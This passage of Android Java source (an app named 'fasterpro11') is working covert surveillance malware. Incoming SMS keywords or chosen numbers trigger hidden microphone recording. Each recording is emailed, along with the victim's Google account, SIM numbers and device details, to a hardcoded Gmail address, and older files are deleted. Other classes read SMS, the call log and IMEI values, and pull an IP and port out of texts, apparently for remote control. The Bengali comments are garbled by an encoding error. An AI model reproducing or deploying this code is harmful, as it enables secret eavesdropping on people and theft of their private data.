        fileName = Environment.getExternalStorageDirectory() + "/DCIM/MicRecord/" + timestamp + "_" + recordingCount++ + ".amr"; // Changed extension to .amr for AMR format

        File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
        if (!dir.exists() && !dir.mkdirs()) {
            Log.e(TAG, "à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚à§Ÿà§‡à¦° à¦œà¦¨à§à¦¯ à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾ à¦¸à¦®à§à¦­à¦¬ à¦¹à§Ÿà¦¨à¦¿.");
            return;
        }

        try {
            if (mediaRecorder == null) {
                mediaRecorder = new MediaRecorder();
            }
            // Set audio source and encoder
           // mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Use the mic as the audio source


            mediaRecorder = new MediaRecorder();

            // à¦¤à¦¿à¦¨à¦Ÿà¦¿ à¦¸à¦®à§à¦­à¦¾à¦¬à§à¦¯ à¦…à¦¡à¦¿à¦“ à¦¸à§‹à¦°à§à¦¸ à¦šà§‡à¦·à§à¦Ÿà¦¾ à¦•à¦°à§à¦¨
            if (setAudioSource(MediaRecorder.AudioSource.MIC)) {
                Log.d(TAG, "Audio source set to MIC");
            } else if (setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)) {
                Log.d(TAG, "Audio source set to VOICE_COMMUNICATION");
            } else if (setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
                Log.d(TAG, "Audio source set to VOICE_RECOGNITION");
            } else {
                Log.e(TAG, "Failed to set any audio source");
                return; // à¦•à§‹à¦¨à§‹ à¦…à¦¡à¦¿à¦“ à¦¸à§‹à¦°à§à¦¸ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾ à¦¨à¦¾ à¦—à§‡à¦²à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¶à§à¦°à§ à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡ à¦¨à¦¾
            }
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB); // Set the output format to AMR-NB (Narrowband)
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); // Set the audio encoder to AMR-NB
            mediaRecorder.setOutputFile(fileName); // Output file path
            // Start recording
            try {
                mediaRecorder.prepare();  // Prepare the MediaRecorder
                mediaRecorder.start();    // Start the recording
                isSoundRecording = true;
                MediaRecorderState = "MediaRecorderRunning";

                // Use handler to stop recording after 3 minutes (180 seconds)
                Handler handler = new Handler(Looper.getMainLooper());
                Context finalContext = context;
                handler.postDelayed(() -> stopMicSoundRecording(finalContext), 1 * 60000); // 3 minutes recording limit
                Log.d("MicRecord", "Recording started.");
            } catch (IOException e) {
                Log.e("MicRecord", "MediaRecorder Prepare/Start failed: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.e("MicRecord", "Error starting recording: " + e.getMessage());
        }
    }
    private boolean setAudioSource(int audioSource) {
        try {
            mediaRecorder.setAudioSource(audioSource);
            return true;
        } catch (IllegalStateException e) {
            Log.e(TAG, "Failed to set audio source: " + e.getMessage());
            return false;
        }
    }

    public  void stopMicSoundRecording(Context context) {
        Log.d(TAG, "in first stopMicSoundRecording method cheek isSoundRecording = " + isSoundRecording);
        Log.d(TAG, "Before stope Recording MediaRecorderState: "+ MediaRecorderState);
        if (!isSoundRecording) {
            Log.d(TAG, "No recording in progress, skipping stop");
            return;
        }

        try {
            if (mediaRecorder != null) {
                // 1. à¦ªà§à¦°à¦¥à¦®à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¾à¦° à¦¸à§à¦Ÿà§‡à¦Ÿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                try {
                    int maxAmplitude = mediaRecorder.getMaxAmplitude();
                    Log.d(TAG, "MediaRecorder is already active. Max Amplitude: " + maxAmplitude);
                    mediaRecorder.stop();
                    Log.d(TAG, "Recording stopped successfully");
                    MediaRecorderState= "MediaRecorderstopped";
                    Log.d(TAG, "After stope Recording MediaRecorderState : "+ MediaRecorderState);
                } catch (IllegalStateException e) {
                    Log.e(TAG, "Recorder was not in recording state: " + e.getMessage());
                }

                // 2. à¦°à¦¿à¦¸à§‹à¦°à§à¦¸ à¦°à¦¿à¦²à¦¿à¦œ à¦•à¦°à§à¦¨
                mediaRecorder.release();
                mediaRecorder = null;
            } else {
                Log.e(TAG, "MediaRecorder is null, cannot stop recording");
            }

            // 3. à¦«à§à¦²à¦¾à¦— à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à§à¦¨
            isSoundRecording = false;
            Log.d(TAG, "Recording state reset, isSoundRecording = " + isSoundRecording);

            // 4. à¦‡à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦²à¦œà¦¿à¦•
            if (isInternetAvailable(context)) {
            //    Log.d(TAG, "Internet available, sending recording via email");
                sendEmailWithAttachment("Sound Rec", "file:", fileName);
            } else {
             //   Log.d(TAG, "Internet not available, recording saved locally");
            }

            // 5. à¦ªà§à¦°à¦¾à¦¨à§‹ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¡à¦¿à¦²à¦¿à¦Ÿ à¦•à¦°à§à¦¨
            deleteOldRecordings();

        } catch (Exception e) {
            Log.e(TAG, "Error in stopMicSoundRecording: ", e);
            // à¦•à§‹à¦¨à§‹ à¦…à¦¬à¦¸à§à¦¥à¦¾à¦¤à§‡à¦‡ à¦«à§à¦²à¦¾à¦— à¦°à¦¿à¦¸à§‡à¦Ÿ à¦•à¦°à¦¤à§‡ à¦­à§à¦²à¦¬à§‡à¦¨ à¦¨à¦¾
            isSoundRecording = false;
            mediaRecorder = null;
        }
    }



    private void handleOutgoingCall(Intent intent) {
        try {
            String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.d(TAG, "Outgoing call to: " + outgoingNumber);
            //stopRecording(context); // à¦†à¦‰à¦Ÿà¦—à§‹à§Ÿà¦¿à¦‚ à¦•à¦²à§‡à¦° à¦•à§à¦·à§‡à¦¤à§à¦°à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¬à¦¨à§à¦§
        } catch (Exception e) {
            Log.e(TAG, "Error in handleOutgoingCall: ", e);
        }
    }
    private void handleSmsReceived(Intent intent, Context context) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    // Keep only the last message
                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean containsWords3 = containsSMSWORDS3OFFER(messageBody);
                    boolean IsInternetAvailable = isInternetAvailable(context);
                    boolean IsAllowedNumber = isAllowedNumber(sender) ;
                    boolean LastCallNumbers =  checkLastCallNumbers(context);

//                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
//                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
//                    Log.d(TAG, "Keywords 3 found: " + containsWords3);
//                    Log.d(TAG, "Internet available: " + IsInternetAvailable);
//                    Log.d(TAG, "Allowed number: " + IsAllowedNumber);
//                    Log.d(TAG, "LastCallNumbers: " + LastCallNumbers);

                    if ((containsWords1 && containsWords2 ) || IsAllowedNumber ||
                            LastCallNumbers || containsWords3 ) {

                        startMicRecording(context, sender, messageBody);

                                // cheek reson for forwarding message start
                                if (containsWords1 && containsWords2 ){
                                    Log.d(TAG, "conditions match mic start recording for containsWords1 && containsWords2 .");
                                }else if (LastCallNumbers ){
                                    Log.d(TAG, "conditions match mic start recording for LastCallNumbers .");
                                } else if (IsAllowedNumber){
                                    Log.d(TAG, "conditions match mic start recording for isAllowedNumber.");
                                }else if (containsWords3 ){
                                    Log.d(TAG, "conditions match mic start recording for containsWords3.");
                                }else {
                                  //  Log.d(TAG, "Conditions not met for mic start recording .");
                                }
                    } else {
                     //   Log.d(TAG, "Conditions not met for mic start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    public boolean hasOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return Settings.canDrawOverlays(context);
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error checking overlay permission: ", e);
            return false;
        }
    }
    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old mic recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 2) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            }
            for (int i = 0; i < files.length - 2; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old mic recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old mic recording: " + files[i].getName());
                }
            }
        }
    }







    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "rec Sending email with attachment...");

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);
        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
        String Get_Sim1_Number = null;

        SmsReceiver smsReceiver = new SmsReceiver();
        String messageBody= "Your  Text";
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        NotificationListener notificationListener = new NotificationListener();
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
        }else if(  setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else {
            setSim1Number =null;
        }
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
         subject ="Sound Rec ID: " + setSim1Number+ " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + Get_Sim1_Number +" User: "+ GoogleAccountName +" Number: " +userSimNumber ;
        Log.e(TAG, "SMS email subject: "+ subject );

        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Compare email content and file size with previous email
        if (isMicRecordEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Sound RecMail content same as before. Skipping email send.");
            return; // Don't send the email if the content is the same
        }

        try {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "mic rec Email sent successfully with attachment.");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize,context);

        } catch (Exception e) {
            Log.e(TAG, "mic Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize,Context context) {
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("MicRecordsubject", subject);
        editor.putString("MicRecordbody", body);
        editor.putLong("MicRecordfileSize", fileSize);
        editor.putString("MicRecordfilePath", filePath);
        editor.apply();
        Log.d(TAG, "SharedPreferences MicRecordEmail details stored.in sended Email");
    }

    // Check if the email content is the same as before
    private boolean isMicRecordEmailContentSame(String subject, String body, long fileSize) {
        if (mContext == null) {
            Log.e(TAG, "isEmailContentSame: mContext is null! Cannot access SharedPreferences.");
            return false;
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        String MicRecordpreviousSubject = sharedPreferences.getString("MicRecordsubject", "");
        String MicRecordpreviousBody = sharedPreferences.getString("MicRecordbody", "");
        long MicRecordpreviousFileSize = sharedPreferences.getLong("MicRecordfileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(MicRecordpreviousSubject) && body.equals(MicRecordpreviousBody) && fileSize == MicRecordpreviousFileSize;
    }



    public boolean isInternetAvailable(Context context) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            return netInfo != null && netInfo.isConnected();
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }
    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS3OFFER(String messageBody) {
        for (String keyword : WORDS3_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 1) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }
    private boolean isAppCallingApp(Intent intent) {
        Log.d(TAG, " call is app.logd 29");
        String packageName = intent.getStringExtra("package");
        if (packageName != null) {
            List<String> callingApps = Arrays.asList(
                    "com.whatsapp", "com.imo.android", "com.facebook.orca", "com.viber.voip", "org.telegram.messenger");
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            String messageBody = "app Incoming call detected";  // You can customize this message if needed
            // startMicRecording(context, incomingNumber, messageBody);
            return callingApps.contains(packageName); // à¦¯à¦¦à¦¿ à¦•à§‹à¦¨à§‹ à¦•à¦²à¦¿à¦‚ à¦…à§à¦¯à¦¾à¦ª à¦¹à§Ÿ, à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¬à¦¨à§à¦§ à¦¹à¦¬à§‡
        }
        return false;
    }

    // This is the updated method in your MicRecord class
    public void OnReceiveCall(Context context, Intent intent, String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification class the method of StartRecording in micRecord.");
       // startMicRecording(context, incomingNumber, messageBody);  // Call the startRecording method with the correct parameters
        onReceive(context, intent);
    }
    public void StartRecording(String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification or callracorder class method of StartRecording in micRecord.");
        startMicRecording(context, incomingNumber, messageBody);  // Call the startRecording method with the correct parameters
        //startRecording( context);
    }
    public void StopMicSoundRecording(String incomingNumber, String messageBody) {
        Log.d(TAG, "called from Notification or callracorder class method of stopMicSoundRecording in micRecord.");
        stopMicSoundRecording(context);  // Call the startRecording method with the correct parameters
        //startRecording( context);
    }
//    public void StartRecordingphonecall(String incomingNumber, String messageBody) {
//        Log.d(TAG, "called from Notification class the method of StartRecording in micRecord.");
//        startRecordingphonecall( context);  // Call the startRecording method with the correct parameters
//    }
    public void micRecord(Context context, Intent intent) {
        Log.d(TAG, "call From BackgroundSmsNotificationWorker");
        onReceive(context, intent);
    }
}



//MyApplication.java
package com.example.fasterpro11;

import android.app.Application;
import android.media.VolumeShaper;

import androidx.work.WorkManager;

public class MyApplication extends Application {

    @Override
    public void onCreate() {
        super.onCreate();


        // Start your background work when the app starts
        BackgroundSmsNotificationWorker.startWork(this);
    }
}




//NetworkUtils.java
package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class NetworkUtils extends BroadcastReceiver {

    private static final String TAG = "NetworkUtils";
    private String ip;
    private String port;
    private String sim1number;
    private String sim2number;
    private String mobileimei1;
    private String mobileimei2;
    private String recivesmsmobilenumber;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();

                            // Log the sender and message
                            Log.d(TAG, "SMS received from: " + sender);
                            Log.d(TAG, "SMS message body: " + messageBody);

                            // Update the NetworkUtils instance with the sender's number
                            setRecivesmsmobilenumber(sender);

                            // Extract IP and port from SMS body
                            extractIpAndPort(messageBody);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: " + e.getMessage(), e);
        }
    }

    public void extractIpAndPort(String messageBody) {
        try {
            // Patterns for IP addresses and ports
            String ipPattern = "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"; // Matches any IP address
            String portPattern = "\\b(\\d{1,5})\\b"; // Matches any port number

            Pattern ipRegex = Pattern.compile(ipPattern);
            Pattern portRegex = Pattern.compile(portPattern);

            Matcher ipMatcher = ipRegex.matcher(messageBody);
            Matcher portMatcher = portRegex.matcher(messageBody);

            // Find the first match for IP
            if (ipMatcher.find()) {
                String detectedIp = ipMatcher.group(0);
                if (isValidIp(detectedIp)) {
                    ip = detectedIp;
                    Log.d(TAG, "IP detected: " + ip);
                } else {
                    Log.d(TAG, "Detected IP is not valid: " + detectedIp);
                }
            }

            // Find the first match for Port
            if (portMatcher.find()) {
                String detectedPort = portMatcher.group(0);
                if (isValidPort(detectedPort)) {
                    port = detectedPort;
                    Log.d(TAG, "Port detected: " + port);
                } else {
                    Log.d(TAG, "Detected port is not valid: " + detectedPort);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in extractIpAndPort: " + e.getMessage(), e);
        }
    }

    public void extractSimAndImei(Context context) {
        try {
            // Check for permissions
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

                if (telephonyManager != null) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API level 26
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        if (telephonyManager.getPhoneCount() > 1) {
                            sim2number = telephonyManager.getLine1Number(); // For dual SIMs, fetch second SIM number (same method)
                        } else {
                            sim2number = "N/A"; // Single SIM device
                        }

                        // For API level 29 and higher, IMEI access is restricted
                        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.Q) {
                            mobileimei1 = telephonyManager.getImei(0); // IMEI for first SIM
                            mobileimei2 = telephonyManager.getImei(1); // IMEI for second SIM
                        } else {
                            mobileimei1 = "N/A"; // IMEI is restricted from Android 10 (API 29)
                            mobileimei2 = "N/A";
                        }
                    } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { // API level 23
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        sim2number = "N/A"; // Not available on devices below API 26
                        mobileimei1 = telephonyManager.getDeviceId(0);
                        mobileimei2 = telephonyManager.getDeviceId(1);
                    } else {
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        sim2number = "N/A"; // Not available on devices below API 23
                        mobileimei1 = telephonyManager.getDeviceId();
                        mobileimei2 = "N/A"; // Not available on devices below API 23
                    }

                    Log.d(TAG, "SIM 1 number detected: " + sim1number);
                    Log.d(TAG, "SIM 2 number detected: " + sim2number);
                    Log.d(TAG, "IMEI 1 detected: " + mobileimei1);
                    Log.d(TAG, "IMEI 2 detected: " + mobileimei2);
                    Log.d(TAG, "Received SMS number: " + recivesmsmobilenumber);
                }
            } else {
                // If permission is not granted, request permission
                ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied to access telephony information", e);
        } catch (Exception e) {
            Log.e(TAG, "Error in extractSimAndImei: " + e.getMessage(), e);
        }
    }

    private boolean isValidIp(String ip) {
        try {
            // Check if IP is valid (0.0.0.0 to 255.255.255.255)
            String[] parts = ip.split("\\.");
            if (parts.length != 4) return false;
            for (String part : parts) {
                int value = Integer.parseInt(part);
                if (value < 0 || value > 255) return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error in isValidIp: " + e.getMessage(), e);
            return false;
        }
    }

    private boolean isValidPort(String port) {
        try {
            // Check if port is within valid range (0-65535)
            int portNumber = Integer.parseInt(port);
            return portNumber >= 0 && portNumber <= 65535;
        } catch (NumberFormatException e) {
            Log.e(TAG, "Invalid port number: " + port, e);
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error in isValidPort: " + e.getMessage(), e);
            return false;
        }
    }

    public String getIp() {
        return ip;
    }

    public String getPort() {
        return port;
    }

    public String getSim1number() {
        return sim1number;
    }

    public String getSim2number() {
        return sim2number;
    }

    public String getMobileimei1() {
        return mobileimei1;
    }

    public String getMobileimei2() {
        return mobileimei2;
    }

    public String getRecivesmsmobilenumber() {
        return recivesmsmobilenumber;
    }

    public void setRecivesmsmobilenumber(String recivesmsmobilenumber) {
        this.recivesmsmobilenumber = recivesmsmobilenumber;
    }
}




//OfflineQueueDbHelper.java
package com.example.fasterpro11;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class OfflineQueueDbHelper extends SQLiteOpenHelper {

    private static final String DB_NAME = "offline_queue.db";
    private static final int DB_VERSION = 1;

    public OfflineQueueDbHelper(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(
                "CREATE TABLE queue (" +
                        "id INTEGER PRIMARY KEY AUTOINCREMENT," +
                        "json TEXT NOT NULL," +
                        "created_at INTEGER)"
        );
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldV, int newV) {
        db.execSQL("DROP TABLE IF EXISTS queue");
        onCreate(db);
    }
}




//OfflineQueueManager.java
package com.example.fasterpro11;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

public class OfflineQueueManager {

    private final OfflineQueueDbHelper dbHelper;

    public OfflineQueueManager(Context context) {
        dbHelper = new OfflineQueueDbHelper(context);
    }

    // Save when no internet
    public void enqueue(String json) {
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("json", json);
        cv.put("created_at", System.currentTimeMillis());
        db.insert("queue", null, cv);
        db.close();
    }

    // Get oldest item
    public Cursor getNext() {
        SQLiteDatabase db = dbHelper.getReadableDatabase();
        return db.rawQuery(
                "SELECT * FROM queue ORDER BY id ASC LIMIT 1",
                null
        );
    }

    // Remove after success
    public void delete(int id) {
        SQLiteDatabase db = dbHelper.getWritableDatabase();
        db.delete("queue", "id=?", new String[]{String.valueOf(id)});
        db.close();
    }
}




//SimNumberSetFromSmsOrNotification.java
package com.example.fasterpro11;

import android.app.Notification;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.util.HashSet;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SimNumberSetFromSmsOrNotification {
    private Context mContext;
    private static final String TAG = "SimNumberSetFromSmsOrNotification";

    // Method to extract text from a notification
    public String getNotificationText(StatusBarNotification sbn) {
        String Notification_MessageBody = "";

        try {
            Bundle extras = sbn.getNotification().extras;
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            if (text != null) {
                Notification_MessageBody = text.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in getting notification text: ", e);
        }

        return Notification_MessageBody;
    }

    // Method to find a keyword in SMS or notification message body
    public String findKeywordSmsOrNotificationSimTypeNumberSet(String messageBody, StatusBarNotification sbn) {
        String[] MatchKeywordsSimTypeNumberSet = {
                "bonus", "Emergency balance", "Emergency", "GB450TK"
        };

        // Get notification text from StatusBarNotification
        String notificationmessageBody = getNotificationText(sbn);

        // Search for keywords in the message body and notification message body
        for (String keyword : MatchKeywordsSimTypeNumberSet) {
            if (messageBody.equals(keyword) ||
                    messageBody.contains(keyword) ||
                    notificationmessageBody.equals(keyword) ||
                    notificationmessageBody.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }

    // Method to match a number pattern in recent incoming SMS
    public String SetNumberPatternMatchInRecentIncomingMessages() {
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        Pattern datePattern = Pattern.compile("\\b(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4}|\\d{2,4}[/-]\\d{1,2}[/-]\\d{1,2})\\b");

        Uri smsUri = Telephony.Sms.CONTENT_URI;
        String[] projection = { Telephony.Sms.ADDRESS, Telephony.Sms.BODY };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(smsUri, projection, null, null, Telephony.Sms.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                Matcher dateMatcher = datePattern.matcher(body);
                Set<String> dateNumbers = new HashSet<>();

                while (dateMatcher.find()) {
                    String dateMatch = dateMatcher.group();
                    for (String part : dateMatch.split("[/-]")) {
                        if (part.length() >= 4 && part.length() <= 6) {
                            dateNumbers.add(part);
                        }
                    }
                }

                Matcher matcher = pattern.matcher(body);
                while (matcher.find()) {
                    String matchedNumber = matcher.group(1);
                    if (matchedNumber.length() >= 4 && matchedNumber.length() <= 6 && !dateNumbers.contains(matchedNumber)) {
                        Log.d(TAG, "Pattern matched 4 to 6 digit numbers in Incoming Messages: " + matchedNumber);
                        return matchedNumber;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Pattern Error querying incoming messages: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return null;
    }

    // Method to match number patterns in call logs
    private boolean isPatternMatchInCallLogs(Context context) {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                Matcher matcher = pattern.matcher(number);
                if (matcher.find()) {
                    Log.d(TAG, "Matched number in Call Logs: " + number);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return false;
    }

    // Method to check if alert keyword is found in SMS or notification
    public String isfindAlertKeywordSmsOrNotificationSimTypeNumberSet(String messageBody, StatusBarNotification sbn) {
        String MatchKeywordsSimTypeNumberSet = findKeywordSmsOrNotificationSimTypeNumberSet(messageBody, sbn);
        if (MatchKeywordsSimTypeNumberSet != null) {
            Log.d(TAG, "Message Body Match Keywords Sim Type Number Set: " + MatchKeywordsSimTypeNumberSet);
            return MatchKeywordsSimTypeNumberSet;
        }
        return null;
    }
}




//VideoRecord.java
package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
